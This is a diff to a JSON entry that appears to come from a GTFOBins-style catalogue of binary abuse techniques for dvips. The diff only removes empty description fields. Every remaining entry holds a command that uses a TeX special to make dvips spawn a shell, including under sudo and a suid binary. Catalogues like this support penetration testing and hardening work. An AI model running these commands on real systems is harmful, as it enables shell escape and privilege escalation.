@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\ndvips -R0 texput.dvi\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\n./dvips -R0 texput.dvi\n"
       }
     ]
